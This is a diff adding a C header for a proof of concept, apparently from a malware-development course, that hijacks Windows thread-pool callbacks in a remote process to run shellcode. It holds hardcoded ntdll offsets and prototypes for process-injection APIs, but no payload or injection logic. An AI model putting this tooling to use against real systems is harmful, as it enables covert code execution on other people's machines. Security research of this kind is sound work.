@@ -1,0 +1,142 @@
+// Copyright 2026 MalDev Academy
+// TpDirectCallbackHijack - Hijacks the embedded TP_DIRECT.Callback of a live 
+// TP_IO / TP_ALPC / TP_JOB in a remote process to execute shellcode.
+// Based on Pool Party (Alon Leviev / SafeBreach, Black Hat EU 2023)
+// https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/
+
+#pragma once
+#ifndef COMMON_H
+#define COMMON_H
+
+#include <Windows.h>
+#include <Strsafe.h>
+#include <stdio.h>
+
+#include "Structures.h"
+#include "InternalStructures.h"
+#include "DbgMacros.h"
+
+#pragma comment(lib, "Shlwapi.lib")
+
+// =================================================================================================================
+
+#define BUFFER_SIZE_1024                1024
+#define BUFFER_SIZE_2048                2048
+#define BUFFER_SIZE_4096                4096
+
+// =================================================================================================================
+
+
+//
+// RVAs of the per-kind ntdll!TppXpCleanupGroupMemberVFuncs tables inside ntdll.dll.
+// These are the markers used by the pool walker to classify each node in
+// TP_POOL.PoolObjectList as a TP_IO, TP_ALPC, or TP_JOB.
+//
+// These are not resolvable exports. The PoC computes each VA as
+// (local ntdll base + RVA) at startup, then matches against
+// CleanupGroupMember.VFuncs during the pool walk to classify each node.
+// 
+// Captured on Windows 11 build 10.0.26100.9711, and
+// verified manually with WinDbg:
+//
+// ```
+// 0:004> ? ntdll!TppIopCleanupGroupMemberVFuncs   - ntdll
+// Evaluate expression: 1526760 = 00000000`00174be8
+// 0:004> ? ntdll!TppAlpcpCleanupGroupMemberVFuncs - ntdll
+// Evaluate expression: 1527248 = 00000000`00174dd0
+// 0:004> ? ntdll!TppJobpCleanupGroupMemberVFuncs  - ntdll
+// Evaluate expression: 1526792 = 00000000`00174c08
+// ```
+// 
+// If running on a different build, recapture with "NtdllRvaCheck.exe". 
+// One can merge NtdllRvaCheck.exe's logic into this PoC to fetch the RVAs at runtime instead of
+// having them hardcoded. However, that's left out here to keep this PoC minimal.
+//
+
+#define TPP_IOP_CLEANUP_GROUP_MEMBER_VFUNCS_RVA     0x174BE8
+#define TPP_ALPCP_CLEANUP_GROUP_MEMBER_VFUNCS_RVA   0x174DD0
+#define TPP_JOBP_CLEANUP_GROUP_MEMBER_VFUNCS_RVA    0x174C08
+
+// Safety cap for the PoolObjectList walk.
+#define POOL_OBJECT_LIST_MAX_ITER                   512
+
+// =================================================================================================================
+// Nt* function pointer prototypes (resolved from ntdll via GetProcAddress at startup).
+
+typedef NTSTATUS (NTAPI *fnNtQuerySystemInformation)(
+    IN  SYSTEM_INFORMATION_CLASS SystemInformationClass,
+    OUT PVOID                    SystemInformation,
+    IN  ULONG                    SystemInformationLength,
+    OUT PULONG                   ReturnLength                 OPTIONAL);
+
+typedef NTSTATUS (NTAPI *fnNtOpenProcess)(
+    OUT PHANDLE                  ProcessHandle,
+    IN  ACCESS_MASK              DesiredAccess,
+    IN  POBJECT_ATTRIBUTES       ObjectAttributes,
+    IN  PCLIENT_ID               ClientId                     OPTIONAL);
+
+typedef NTSTATUS (NTAPI *fnNtQueryInformationProcess)(
+    IN  HANDLE                   ProcessHandle,
+    IN  PROCESSINFOCLASS         ProcessInformationClass,
+    OUT PVOID                    ProcessInformation,
+    IN  ULONG                    ProcessInformationLength,
+    OUT PULONG                   ReturnLength                 OPTIONAL);
+
+typedef NTSTATUS (NTAPI *fnNtDuplicateObject)(
+    IN  HANDLE                   SourceProcessHandle,
+    IN  HANDLE                   SourceHandle,
+    IN  HANDLE                   TargetProcessHandle          OPTIONAL,
+    OUT PHANDLE                  TargetHandle                 OPTIONAL,
+    IN  ACCESS_MASK              DesiredAccess,
+    IN  ULONG                    HandleAttributes,
+    IN  ULONG                    Options);
+
+typedef NTSTATUS (NTAPI *fnNtClose)(
+    IN  HANDLE                   Handle);
+
+typedef NTSTATUS (NTAPI *fnNtQueryInformationWorkerFactory)(
+    IN  HANDLE                   WorkerFactoryHandle,
+    IN  WORKERFACTORYINFOCLASS   WorkerFactoryInformationClass,
+    OUT PVOID                    WorkerFactoryInformation,
+    IN  ULONG                    WorkerFactoryInformationLength,
+    OUT PULONG                   ReturnLength                 OPTIONAL);
+
+typedef NTSTATUS (NTAPI *fnNtReadVirtualMemory)(
+    IN  HANDLE                   ProcessHandle,
+    IN  PVOID                    BaseAddress,
+    OUT PVOID                    Buffer,
+    IN  SIZE_T                   NumberOfBytesToRead,
+    OUT PSIZE_T                  NumberOfBytesRead            OPTIONAL);
+
+typedef NTSTATUS (NTAPI *fnNtWriteVirtualMemory)(
+    IN  HANDLE                   ProcessHandle,
+    IN  PVOID                    BaseAddress,
+    IN  PVOID                    Buffer,
+    IN  SIZE_T                   NumberOfBytesToWrite,
+    OUT PSIZE_T                  NumberOfBytesWritten         OPTIONAL);
+
+typedef NTSTATUS (NTAPI *fnNtAllocateVirtualMemory)(
+    IN     HANDLE                ProcessHandle,
+    IN OUT PVOID*                BaseAddress,
+    IN     ULONG_PTR             ZeroBits,
+    IN OUT PSIZE_T               RegionSize,
+    IN     ULONG                 AllocationType,
+    IN     ULONG                 Protect);
+
+typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory)(
+    IN     HANDLE                ProcessHandle,
+    IN OUT PVOID*                BaseAddress,
+    IN OUT PSIZE_T               RegionSize,
+    IN     ULONG                 NewProtect,
+    OUT    PULONG                OldProtect);
+
+typedef NTSTATUS (NTAPI *fnNtSetIoCompletion)(
+    IN  HANDLE                   IoCompletionHandle,
+    IN  PVOID                    KeyContext,
+    IN  PVOID                    ApcContext,
+    IN  NTSTATUS                 IoStatus,
+    IN  ULONG_PTR                IoStatusInformation);
+
+// =================================================================================================================
+
+#endif // !COMMON_H
